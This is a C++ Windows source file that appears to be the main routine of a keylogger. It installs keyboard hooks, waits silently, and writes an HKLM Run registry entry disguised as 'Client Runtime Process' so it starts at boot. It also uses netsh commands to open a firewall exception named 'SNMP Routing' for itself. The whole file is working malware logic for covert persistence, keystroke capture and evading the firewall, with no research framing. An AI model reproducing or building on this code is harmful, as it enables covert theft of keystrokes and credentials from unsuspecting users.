#include<iostream>
#include<conio.h>
#include<Shlwapi.h>



#include"KeyFileFunctions.h"
#include "RegFunctions.h"

using std::cout;

const int $osFlag = _GetOsFlag();

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,LPSTR lpCmdLine, int nCmdShow)
{
	if (!_IsSingleton())
	{
		exit(0);
	}
	Sleep(15000);
	//ShowWindowAsync(FindWindowW(L"ConsoleWindowClass",NULL),11);
	//_ExtractFromRes(L"d:\\ctest\\resextaract.exe",L"EXESEND");
	//wprintf(L"ResExtendError: %d\n",ExtendResError);
	//wprintf(L"OsVer:%s -%s\n",GetOsName(),GetOsArch());
	//wprintf(L"isAdmin: %s\n",BoolToTextW(_IsAdmin()));
	//_ProcessClose(L"NoTepaD.ExE");
	//wprintf(L"isSingleton: %s\n",BoolToTextW(_IsSingleton()));
	////wprintf(L"Process Id: %d",);
	/*
	////wprintf (L"_SaveResToFile Resturns: %s\n",BoolToTextW(_SaveResToFile(L"d:\\testbyxoby.exe",IDR_101, 10, 2057, L"D:\\Data\\Projects\\C++ Project\\Current\\KeyFile\\Release\\KeyFile.exe")));
	//system("pause");
	LPWSTR path = L"c:\\windows\\system32";
	//wprintf(L"Before Correct: %s %d\n",path,lstrlenW(path));
	int i=1;
	while (path[i])
	{
		
		if (lstrcmp(path[i],path[i-1])==0)
		{
			if (StrCmpW(path[i],L"\\")==0)
			{
				//wprintf(L"\nPAth is incorrect\n");
			}
		}
		
		i++;
	}
	//wprintf(L"After Correct: %s\n",path);
	*/
	//wprintf(L"ComputerName: %s\nUserName: %s\nTempDir: %s\nSystemDir: %s\nAppData: %s\n",_GetComputerName(),_GetUserName(),_GetTempDir(),_GetSystemDir(),_GetAppDataDir());

	SheduleFlagCheck(200);
	_PopulateKeys($__KL_Array_Virtual_Keys);

	if(!_SetHooks(TRUE))
		//wprintf(L"*Error => _SetHooks Failed\n");
	SheduleResetHook(15); //min
	SheduleResetVariables(7); //hour
	_ComputerName = _GetComputerName();
	
	DWORD nResult(0);
	BOOL nError = GetDWORDRegKey(HKEY_LOCAL_MACHINE,L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion", L"ProgramId", nResult);
	if (nError)
    {
       
		if (nResult >=111)
		{
			wsprintf(_ComputerName,L"%s-%d",_ComputerName,nResult);
		}
    }
	else
	{
		//wcout<<"Error: Dword Value Not Found.."<<endl;
	}

	//wcout<<"Computer Name: "<<_ComputerName<<endl;

	_RegWrite(HKEY_LOCAL_MACHINE,L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",REG_SZ,L"Client Runtime Process", $launchloc);



	LPWSTR dosCommand = new TCHAR[1024];
	if ($osFlag == 1)
	{
		wsprintf(dosCommand,L"netsh firewall delete allowedprogram \"%s\"",gProgramFullPath);
		_RunDos(dosCommand,NULL,TRUE);
		wsprintf(dosCommand,L"netsh firewall add allowedprogram \"%s\" \"SNMP Routing\" ENABLE",gProgramFullPath);
		_RunDos(dosCommand);
	}
	else
	{
		_RunDos(L"netsh advfirewall firewall delete rule name= \"SNMP Routing\"",NULL,TRUE);
		wsprintf(dosCommand,L"netsh advfirewall firewall add rule name= \"SNMP Routing\" dir=in action=allow program= \"%s\" \"SNMP Routing\"  enable=yes",gProgramFullPath);
		_RunDos(dosCommand);
	}
	
	delete[] dosCommand;
	
	MsgLoop();
	return TRUE;
}
